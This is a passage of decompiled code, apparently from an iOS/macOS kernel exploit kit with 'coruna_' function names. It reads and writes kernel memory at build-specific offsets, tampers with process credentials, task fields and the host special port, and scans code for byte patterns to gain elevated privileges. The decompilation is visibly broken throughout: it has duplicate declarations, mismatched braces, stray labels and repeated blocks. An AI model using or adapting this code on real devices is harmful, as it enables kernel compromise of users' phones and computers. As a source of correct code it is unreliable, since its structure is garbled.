      if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
      (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
      *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
      *(long *)(&k_kernel_slot_1900 + handle) = handle;
      }
      u = coruna_kernel6544_via_vm_deallocate_f7f8(handle,handle,id_2,arg);
      return u;
      }
      }
      }
      return 0;
    }
    if (err != 0x1c1b) {
      return 0;
    }
    version = 0x94;
    size = 0x1c1b19145fffff;
  }
  else {
    if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
      return 0;
    }
fail:
    version = 0x40;
    size = 0x1f530f027fffff;
  }
  if (*(unsigned long *)(handle + 0x158) <= size) {
    version = 0x9c;
  }
done:
  if (flags - 1U < 2) {
    scratch = 2;
    flavor = 0xd;
    err = 8;
  }
  else {
    if (flags != 3) {
      return 0;
    }
    version = version + 8;
    scratch = 8;
    flavor = 0xf;
    err = 0x20;
  }
  if (err == (int)arg) {
    lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
    if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = coruna_kernel6544_via_return_zero_2b000(handle,val);
        if (handle == 0) {
          return 0;
        }
      }
      else {
        handle = coruna_return_zero_2ce5c();
        if (handle == 0) {
          return 0;
        }
      }
      handle = handle + (unsigned long)version;
      u = coruna_nop_stub_6(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
        return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
        if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
           (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
          *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
          *(long *)(&k_kernel_slot_1900 + handle) = handle;
        }
        u = coruna_kernel6544_via_vm_deallocate_f7f8(handle,handle,id_2,arg);
        return u;
      }
    }
  }
  return 0;
}





uint coruna_pthread_attr_setdetachstate_2e9c4(long handle,uint64_t *val,uint64_t id_2,void *ctx)
{
  uint u;
  mach_port_t target_act;
  int err;
  uint size;
  void **lppv4;
  pthread_t scratch;
  pthread_attr_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = (pthread_t)0x0;
  u = _pthread_attr_init(&bootargs);
  if (u != 0) {
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
    }
    ___stack_chk_fail(u);
  }
  u = _pthread_attr_setdetachstate(&bootargs,1);
  if (u == 0) {
    lppv4 = (void **)coruna_fn_ptr_cast(id_2);
    u = _pthread_create_suspended_np(&scratch,&bootargs,lppv4,ctx);
    size = -u;
    if (-1 < (int)u) {
    size = u;
    }
    size = size | 0x40000000;
    }
    u = _pthread_attr_destroy(&bootargs);
    fail:
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  else {
done:
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
  }
  u = _pthread_attr_destroy(&bootargs);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel6544_via_return_zero_37b2c(long handle,uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint32_t size;
  unsigned long unaff_x30;
  uint8_t scratch[8];
  
  size = 0x4000000;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    size = 1;
  }
  if ((int)val != 0) {
    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_4(handle,val,0);
    u = 0;
    if (handle != 0) {
      addr = coruna_return_zero_2c9a0(handle,id_2);
      u = 0;
      if (((addr != 0) && (u = coruna_kernel6544_residual_256(handle,addr,scratch), (int)u != 0)) &&
         (u = coruna_return_zero_37b2c(handle,id_2,size,1), (int)u != 0)) {
        coruna_kernel6544_via_return_zero_2e5d4(handle,handle);
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          u = coruna_call_mach_vm_machine_attribute_29df8(handle,addr,handle);
          err = (int)u;
        }
        else {
          u = coruna_kernel6544_via_mach_vm_machine_attribute_29df8();
          err = (int)u;
        }
        if (err != 0) {
          u = 1;
        }
      }
    }
    return u;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_return_zero_37b2c(handle,id_2,size,0);
  return u;
}





bool coruna_pthread_join_2ec18(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  pthread_t scratch;
  
  scratch = (pthread_t)0x0;
  u = coruna_pthread_attr_setdetachstate_2e9c4(val,&scratch,id_2,size_3);
  if (u == 0) {
    err = _pthread_join(scratch,(void **)0x0);
    u = (uint)(err != 0);
  }
  return u == 0;
}





uint64_t coruna_getuid(long handle,uint size,int flags,int count_2)
{
  uint8_t *ptr;
  uid_t u;
  int err;
  long handle;
  uint64_t size;
  uint scratch;
  uint scratch;
  uint bootargs;
  uint32_t thread_attr;
  int bootargs;
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  int serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t stack_guard;
  uint32_t tmp_buf;
  uint64_t region;
  uint64_t sa_saved;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t sa_new;
  uint64_t frame;
  int path_buf;
  uint8_t tmp_buf[28];
  uint region;
  long plist;
  long url_buf;
  long json_buf;
  unsigned long frame;
  
  u = _getuid();
  ptr = k_kernel_mach_task_self_slot;
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_4(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0);
  if (handle == 0) {
    return 0;
  }
  size = coruna_nop_stub_6(handle,handle + 0x68,4,&path_buf);
  if ((int)size == 0) {
    return size;
  }
  if ((*(int *)(&k_kernel_slot_1910 + handle) == 0) && (*(int *)(&k_kernel_slot_1914 + handle) == 0)) {
    *(uid_t *)(&k_kernel_slot_1910 + handle) = u;
    *(int *)(&k_kernel_slot_1914 + handle) = path_buf;
  }
  if ((u == size) && (path_buf == flags)) {
    return 1;
  }
  if (count_2 == 0) {
    err = coruna_ctx_test_flag(handle,4);
    if (err != 0) {
      return 0;
    }
    handle = *(long *)(&k_kernel_slot_18e0 + handle);
    size = coruna_nop_stub_6(handle,handle + 0x18,0x58,&block_ctx);
    if ((int)size == 0) {
    return size;
    }
    serial_buf = region;
    action = plist;
    thread_attr = sa_saved;
    stack_guard = json_buf;
    block_ctx = url_buf;
    sa_saved = frame;
    host_info = sa_new;
    _local_160 = coruna_u64_pack((size), (size));
    _uStack_158 = coruna_u64_pack((path_buf), (size));
    _local_150 = coruna_u64_pack((tmp_buf), (flags));
    serial_buf = flags;
    action = flags;
    err = _memcmp(&scratch,&block_ctx,0x58);
    if ((err != 0) && (size = coruna_kernel6544_via_vm_deallocate_f7f8(handle,handle + 0x18,&scratch,0x58), (int)size == 0))
    {
    return size;
    }
    frame = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)ptr);
    if (frame != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
    handle = 0xb0;
    }
    else if (err == 0x1809) {
    handle = 200;
    }
    else {
    if (err != 0x1c1b) {
    return 0;
    }
    handle = 0xb8;
    }
    }
    else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
    return 0;
    }
    handle = 0xa8;
    }
    err = coruna_kernel6544_residual_256(handle,handle + frame,&frame);
    if (err != 0) {
    if (frame == 0) {
    err = coruna_ctx_test_flag(handle,0x5584001);
    if (err == 0) {
    handle = coruna_return_zero_154a0(handle,0);
    if (((handle != 0) &&
    (err = coruna_open_m2scaler_144a8(handle,handle,size,1,0,0,&frame), err != 0)) &&
    (err = coruna_open_m2scaler_144a8(handle,handle,u,0xffffffffffffffff,0,0,&frame), err != 0
    )) {
    return 1;
    }
    }
    else {
    handle = *(long *)(&k_kernel_slot_1990 + handle);
    if (handle == 0) {
    coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1);
    if (handle == 0) {
    return 0;
    }
    handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
    if (handle == 0) {
    return 0;
    }
    *(long *)(&k_kernel_slot_1990 + handle) = handle;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&frame);
    if (((err != 0) && (frame < 0x400)) &&
    ((err = coruna_kernel6544_residual_256(handle,handle + *(int *)(handle + 0x168),&json_buf), err != 0
    && (((handle = coruna_ptr_canonicalize(handle,json_buf), handle != 0 &&
    (err = coruna_kernel6544_residual_256(handle,json_buf +
    (frame & size) *
    (long)*(int *)(handle + 0x168),&url_buf),
    err != 0)) && (handle = coruna_ptr_canonicalize(handle,url_buf), handle != 0)))))) {
    while (err = coruna_nop_stub_6(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
    &region), err != 0) {
    if (region == size) {
    err = coruna_kernel6544_residual_256(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
    &plist);
    if (err == 0) {
    return 0;
    }
    plist = plist + 4;
    err = coruna_kernel6544_residual_257(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
    if (err == 0) {
    return 0;
    }
    {
    if (url_buf != 0) {
    return 1;
    }
    }
    }
    err = coruna_kernel6544_residual_256(handle,url_buf,&url_buf);
    if (err == 0) {
    return 0;
    }
    url_buf = coruna_ptr_canonicalize(handle,url_buf);
    if (url_buf == 0) {
    return 0;
    }
    }
    }
    }
    }
    else {
    url_buf = coruna_ptr_canonicalize(handle);
    joined_r0x00032994:
    if (url_buf != 0) {
    return 1;
    }
    }
    }
    }
    return 0;
  }
  block_ctx = 0;
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_4(handle,*(uint32_t *)ptr,&block_ctx);
  if (handle == 0) {
    return 0;
  }
  if (*(long *)(&k_kernel_slot_18e0 + handle) == 0) {
    *(long *)(&k_kernel_slot_18e0 + handle) = handle;
    *(uint64_t *)(&k_kernel_slot_18e8 + handle) = block_ctx;
  }
fail:
  size = coruna_nop_stub_6(handle,handle + 0x18,0x58,&block_ctx);
  if ((int)size == 0) {
    return size;
  }
  serial_buf = region;
  action = plist;
  thread_attr = sa_saved;
  stack_guard = json_buf;
  block_ctx = url_buf;
  sa_saved = frame;
  host_info = sa_new;
  _local_160 = coruna_u64_pack((size), (size));
  _uStack_158 = coruna_u64_pack((path_buf), (size));
  _local_150 = coruna_u64_pack((tmp_buf), (flags));
  serial_buf = flags;
  action = flags;
  err = _memcmp(&scratch,&block_ctx,0x58);
  if ((err != 0) && (size = coruna_kernel6544_via_vm_deallocate_f7f8(handle,handle + 0x18,&scratch,0x58), (int)size == 0))
  {
    return size;
  }
  frame = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)ptr);
  if (frame != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        handle = 0xb0;
      }
      else if (err == 0x1809) {
        handle = 200;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        handle = 0xb8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      handle = 0xa8;
    }
    err = coruna_kernel6544_residual_256(handle,handle + frame,&frame);
    if (err != 0) {
      if (frame == 0) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          handle = coruna_return_zero_154a0(handle,0);
          if (((handle != 0) &&
              (err = coruna_open_m2scaler_144a8(handle,handle,size,1,0,0,&frame), err != 0)) &&
             (err = coruna_open_m2scaler_144a8(handle,handle,u,0xffffffffffffffff,0,0,&frame), err != 0
             )) {
            return 1;
          }
        }
        else {
          handle = *(long *)(&k_kernel_slot_1990 + handle);
          if (handle == 0) {
            coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
            handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1);
            if (handle == 0) {
              return 0;
            }
            handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
            if (handle == 0) {
              return 0;
            }
            *(long *)(&k_kernel_slot_1990 + handle) = handle;
          }
          err = coruna_kernel6544_residual_256(handle,handle,&frame);
          if (((err != 0) && (frame < 0x400)) &&
             ((err = coruna_kernel6544_residual_256(handle,handle + *(int *)(handle + 0x168),&json_buf), err != 0
              && (((handle = coruna_ptr_canonicalize(handle,json_buf), handle != 0 &&
                   (err = coruna_kernel6544_residual_256(handle,json_buf +
                                                 (frame & size) *
                                                 (long)*(int *)(handle + 0x168),&url_buf),
                   err != 0)) && (handle = coruna_ptr_canonicalize(handle,url_buf), handle != 0)))))) {
            while (err = coruna_nop_stub_6(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
                                        &region), err != 0) {
              if (region == size) {
                err = coruna_kernel6544_residual_256(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
                                     &plist);
                if (err == 0) {
                  return 0;
                }
                plist = plist + 4;
                err = coruna_kernel6544_residual_257(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
                if (err == 0) {
                  return 0;
                }
                {
                  if (url_buf != 0) {
                  return 1;
                  }
                }
              }
              err = coruna_kernel6544_residual_256(handle,url_buf,&url_buf);
              if (err == 0) {
                return 0;
              }
              url_buf = coruna_ptr_canonicalize(handle,url_buf);
              if (url_buf == 0) {
                return 0;
              }
            }
          }
        }
      }
      else {
        url_buf = coruna_ptr_canonicalize(handle);
joined_r0x00032994:
        if (url_buf != 0) {
          return 1;
        }
      }
    }
  }
  return 0;
}





unsigned long coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_5(uint64_t arg,uint64_t val,uint n,uint *m)

{
  int count;
  unsigned long type_id_14;
  uint cache_33;
  
  type_id_14 = coruna_kernel6544_via_fcntl_1bf84(arg,val,&cache_33);
  if ((int)type_id_14 != 0) {
    if (m != (uint *)0x0) {
      *m = cache_33 & 0x3ff;
    }
    cache_33 = cache_33 & 0xfffffc00 | n & 0x3ff;
    count = coruna_mach_vm_machine_attribute(arg,val);
    type_id_14 = (unsigned long)(count != 0);
  }
  return type_id_14;
}





void coruna_kernel6544_via_mach_port_insert_right(uint *size,uint64_t val)
{
  if ((*(unsigned long *)(size + 0x56) < 0x225c1e80500000) &&
     ((*(unsigned long *)(size + 0x56) < 0x225c1980500000 ||
      ((*size & 0x5584001) != 0 && (*size & 1) == 0)))) {
    coruna_mach_port_insert_right(size,val,4,0,0xf);
    return;
  }
  coruna_mach_port_insert_right(size,val,2,0,3);
  return;
}





unsigned long coruna_host_get_special_port(uint *arg)

{
  mach_port_t host_priv;
  kern_return_t lk1;
  int flags;
  long serial_10;
  unsigned long size;
  uint32_t cache_20;
  uint cache_33;
  
  host_priv = _mach_host_self();
  if (1 < arg[0x648] + 1) {
    return (unsigned long)arg[0x648];
  }
  lk1 = _host_get_special_port(host_priv,-1,2,&cache_33);
  if (lk1 != 0) {
    size = *(unsigned long *)(arg + 0x56);
    if ((size < 0x1f530000000000) ||
       ((((*arg & 0x5584001) == 0 && (size < 0x22580a06c00000)) &&
        ((size < 0x1f543c40800000 || (0x2257 < (int)arg[0x50])))))) {
      serial_10 = coruna_ret_stub_3(arg,host_priv);
      if (serial_10 == 0) {
        return 0;
      }
      size = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_5(arg,serial_10,4,&cache_20);
      if ((int)size == 0) {
        return size;
      }
      flags = _host_get_special_port(host_priv,-1,2,&cache_33);
      coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_5(arg,serial_10,cache_20,0);
    }
    else {
      serial_10 = coruna_return_zero_2dd18(arg,2);
      if (serial_10 == 0) {
        return 0;
      }
      flags = coruna_arc4random_buf(arg,serial_10,&cache_33);
    }
    if (flags != 0) {
      return 0;
    }
  }
  return (unsigned long)cache_33;
}





uint coruna_kernel6544_via_arc4random_buf(long handle)
{
  int err;
  uint u;
  long handle;
  uint scratch;
  
  u = *(uint *)(&k_kernel_slot_1924 + handle);
  if (*(uint *)(&k_kernel_slot_1924 + handle) + 1 < 2) {
    handle = coruna_return_zero_2dd18(handle,0);
    u = 0;
    if ((handle != 0) &&
       (err = coruna_arc4random_buf(handle,handle,&scratch), u = scratch, err != 0)) {
      u = 0;
    }
  }
  return u;
}
uint64_t coruna_return_zero_32c2c(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long *ptr;
  unsigned long scratch;
  unsigned long bootargs [4];
  long thread_attr;
  
  ptr = &scratch;
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    handle = coruna_kernel6544_via_return_zero_2c3b8_2(handle,val);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel6544_residual_256(handle,handle + 0xb0,&thread_attr);
    if ((int)u == 0) {
      return u;
    }
    handle = coruna_ptr_canonicalize(handle,thread_attr);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel6544_residual_256(handle,thread_attr + 0x50,bootargs + 3);
    if ((int)u == 0) {
      return u;
    }
    if (((bootargs[3] != 0) && (handle = *(long *)(handle + 0x128), handle != 0)) &&
       (bootargs[3] != handle)) {
      bootargs[1] = 0;
      bootargs[2] = 0;
      scratch = 0;
      bootargs[0] = 0;
      err = coruna_nop_stub_6(handle,handle + 0x28,8,bootargs);
      if (((err != 0) &&
          (err = coruna_nop_stub_6(handle,*(long *)(handle + 0x128) + 0x30,8,&scratch), err != 0))
         && ((err = coruna_nop_stub_6(handle,bootargs[3] + 0x28,8,bootargs + 2), err != 0 &&
             (err = coruna_nop_stub_6(handle,bootargs[3] + 0x30,8,bootargs + 1), err != 0)))) {
        if (bootargs[0] < bootargs[2]) {
          handle = bootargs[3] + 0x28;
          ptr = bootargs;
        }
        else {
          handle = bootargs[3] + 0x30;
        }
        err = coruna_return_zero_d6bc(handle,handle,ptr,8);
        if (err != 0) {
          return 1;
        }
      }
      return 0;
    }
  }
  return 1;
}





uint64_t coruna_return_zero_32d7c(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  long addr;
  long scratch;
  unsigned long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  u = coruna_return_zero_26090();
  if ((int)u == 0) {
    return u;
  }
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err != 0) {
        bootargs = 0;
        err = *(int *)(handle + 0x140);
        if (err < 0x2712) {
          if (0x1f52 < err) {
            err = coruna_ctx_test_flag(handle,0x1180000);
            err = err == 0;
            handle = 0xa0;
            addr = 0x98;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel6544_via_return_zero_2c3b8_2(handle,val);
            if (handle == 0) {
            return 0;
          }
          if (0x1c1a < err) {
            err = coruna_ctx_test_flag(handle,0x80000);
            err = err == 0;
            handle = 0xe0;
            addr = 0xd8;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel6544_via_return_zero_2c3b8_2(handle,val);
            if (handle == 0) {
            return 0;
          }
          addr = 0xe8;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            addr = 0xf0;
          }
        }
        else {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          handle = 0xa8;
          addr = 0xa0;
fail:
          if (!err) {
            addr = handle;
          }
        }
        handle = coruna_kernel6544_via_return_zero_2c3b8_2(handle,val);
        if (handle == 0) {
          return 0;
        }
        handle = handle + addr;
        err = coruna_nop_stub_6(handle,handle,8,&bootargs);
        if (err == 0) {
          return 0;
        }
        if (bootargs != 0) {
          scratch = 0;
          if ((*(unsigned long *)k_kernel_vm_page_mask_slot & bootargs) != 0) {
            return 0;
          }
          err = coruna_return_zero_d6bc(handle,handle,&scratch,8);
          if (err == 0) {
            return 0;
          }
          u = coruna_return_zero_d6bc(handle,handle + 8,&scratch,8);
          if ((int)u == 0) {
            return u;
          }
        }
      }
    }
    else {
      addr = coruna_kernel6544_via_return_zero_2c3b8_2(handle,val);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel6544_residual_256(handle,addr + 0xb0,&bootargs);
      if (err == 0) {
        return 0;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel6544_residual_256(handle,bootargs + 0x50,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch != 0) {
        *(long *)(handle + 0x128) = scratch;
        scratch = 0;
        err = coruna_return_zero_d6bc(handle,bootargs + 0x50,&scratch,*(uint32_t *)(handle + 0x168));
        if (err == 0) {
          return 0;
        }
      }
    }
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    addr = 0x10c;
    if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
        return 0;
      }
      addr = 0x11c;
    }
  }
  else {
    if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x94;
        handle = coruna_return_zero_2c3b8(handle,val);
        if (handle == 0) {
        return 0;
        }
        u = coruna_nop_stub_6(handle,handle + addr,4,&thread_attr);
        if ((int)u != 0) {
        thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
        u = coruna_nop_stub_7(handle,handle + addr,&thread_attr,4);
        return u;
        }
        return u;
      }
      if (err != 0x2258) {
        return 0;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return 0;
      }
      addr = 200;
      handle = coruna_return_zero_2c3b8(handle,val);
      if (handle == 0) {
      return 0;
      }
      u = coruna_nop_stub_6(handle,handle + addr,4,&thread_attr);
      if ((int)u != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      u = coruna_nop_stub_7(handle,handle + addr,&thread_attr,4);
      return u;
      }
      return u;
    }
    addr = 0xb4;
  }
done:
  handle = coruna_return_zero_2c3b8(handle,val);
  if (handle == 0) {
    return 0;
  }
  u = coruna_nop_stub_6(handle,handle + addr,4,&thread_attr);
  if ((int)u != 0) {
    thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
    u = coruna_nop_stub_7(handle,handle + addr,&thread_attr,4);
    return u;
  }
  return u;
}





uint64_t coruna_return_zero_3307c(long handle)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint scratch;
  
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2();
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        addr = 0x3c0;
      }
      else if (err == 0x1c1b) {
        addr = 0x3a8;
      }
      else {
        if (err != 0x1f53) {
          return 0;
        }
        addr = 0x4d0;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x430;
        }
      }
    }
    else if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x4c8;
      }
      else {
        if (err != 0x2258) {
          return 0;
        }
        addr = 0x4ac;
      }
    }
    else {
      if ((err != 0x225c) && (err != 0x2712)) {
        return 0;
      }
      addr = 0x6a4;
    }
    err = coruna_kernel6544_via_fcntl_1bf84(handle,addr + handle,&scratch);
    if ((err != 0) && ((scratch & 0xff000000) == 0)) {
      u = scratch & 0xfff71fdf | 0x80000;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        u = scratch | 0x20;
      }
      if ((scratch == (u & 0xffff1fff)) ||
         (scratch = u & 0xffff1fff, err = coruna_mach_vm_machine_attribute(handle,addr + handle), err != 0)) {
        return 1;
      }
    }
  }
  return 0;
}





uint64_t
void coruna_return_zero_2f870(long handle,uint64_t val,uint size,unsigned long arg,uint64_t id_2)
{
  uint u;
  bool err;
  int err;
  long handle;
  uint64_t size;
  long addr;
  long off;
  long base;
  uint version;
  uint port;
  uint tag;
  uint kind;
  void *ptr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint64_t type_id_10;
  uint64_t type_id_11;
  long scratch;
  byte bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  long serial_buf [3];
  byte action;
  int block_ctx;
  byte stack_guard;
  uint64_t scratch;
  
  host_info = 0;
  handle = coruna_kernel6544_via_return_zero_2c3b8_2();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  kind = (uint)id_2;
  tag = (uint)arg;
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      size = coruna_ctx_test_flag(handle,0x200);
      if ((int)size == 0) {
        return size;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err < 0x1f53) {
          if (err < 0x1c1b) {
            if (err < 0x1809) {
              return 0;
            }
            addr = 0xe7;
            if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
              addr = 0xef;
            }
          }
          else {
            addr = 0xdf;
          }
        }
        else {
          addr = 0x97;
        }
      }
      else {
        addr = 0x8f;
      }
      size = coruna_nop_stub_6(handle,addr + handle,1,(long)&host_info + 4);
      if ((int)size == 0) {
        return size;
      }
      host_info = coruna_u64_pack((host_info), (kind));
      if (host_info == kind) {
        return 1;
      }
      size = coruna_nop_stub_7(handle,addr + handle,&host_info,1);
      err = (int)size;
      if (err != 0) {
      return 1;
      }
      return size;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2712) {
      if (0x2257 < err) {
        err = coruna_ctx_test_flag(handle,0x1180000);
        err = err == 0;
        off = 0xbf;
        addr = 0xb7;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_nop_stub_6(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1f52 < err) {
        size = 0x180000;
        err = coruna_ctx_test_flag(handle,size);
        err = err == 0;
        off = 199;
        addr = 0xbf;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_nop_stub_6(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1c1a < err) {
        err = coruna_ctx_test_flag(handle,0x80000);
        err = err == 0;
        off = 0x107;
        addr = 0xff;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_nop_stub_6(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      addr = 0x107;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        addr = 0x10f;
      }
    }
    else {
      size = 0x1180000;
done:
      err = coruna_ctx_test_flag(handle,size);
      err = err == 0;
      off = 199;
      addr = 0xbf;
fail:
      if (!err) {
        addr = off;
      }
    }
    size = coruna_nop_stub_6(handle,addr + handle,4,(long)&host_info + 4);
    if ((int)size == 0) {
      return size;
    }
    version = 0xff00;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      version = 0xff000000;
    }
    port = 0x10000;
    u = 0x1000000;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      port = 0x100;
      u = 0x10000;
    }
    if (tag == 0) {
      u = 0;
    }
    if (size == 0) {
      port = 0;
    }
    kind = u | port | kind | host_info & version;
    host_info = coruna_u64_pack((host_info), (kind));
    if ((host_info != kind) &&
       (size = coruna_return_zero_d6bc(handle,addr + handle,&host_info,4), (int)size == 0)) {
      return size;
    }
    if (*(int *)(handle + 0x140) < 0x1f53) {
      arg = (unsigned long)(size ^ 1 | tag);
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      size = coruna_kernel6544_via_kernel6544_via_kernel09_via_bzero_2_2(handle,val,arg,id_2);
      err = (int)size;
      {
        if (err == 0) {
        return size;
        }
      }
    }
  }
  else {
    size = coruna_nop_stub_6(handle,handle + 0x92,1,&bootargs);
    if ((int)size == 0) {
      return size;
    }
    if (bootargs != kind) {
      thread_attr = (uint8_t)id_2;
      size = coruna_nop_stub_7(handle,handle + 0x92,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
      if (kind != 0) {
        size = coruna_kernel6544_residual_256(handle,handle + *(int *)(handle + 0x168),&scratch);
        if ((int)size == 0) {
          return size;
        }
        ptr = *(void **)(&k_kernel_slot_1d30 + handle);
        if (ptr == (void *)0x0) {
          coruna_return_zero_30a2c(handle,0,0,0);
          if (*(int *)(&k_kernel_slot_18a0 + handle) != 0) {
            type_id = 0;
            do {
              addr = handle + type_id * 0x18;
              off = *(long *)(&k_kernel_slot_1a10 + addr);
              type_id_9 = *(unsigned long *)(&k_kernel_slot_1a18 + addr);
              addr = coruna_ptr_canonicalize(handle,off);
              if (addr != 0 && type_id_9 != 0) {
                err = coruna_nop_stub_6(handle,off + 8,8,&stack_guard);
                if (err == 0) {
                  return 0;
                }
                if (coruna_u64_pack71((scratch), (stack_guard)) == 0x6f74616c75676572) {
                  type_id_8 = 0;
                  do {
                    addr = type_id_8 + off;
                    err = coruna_kernel6544_via_fcntl_1bf84(handle,addr,&block_ctx);
                    if (err == 0) break;
                    if (block_ctx == -0x1120531) {
                      if (addr == 0) {
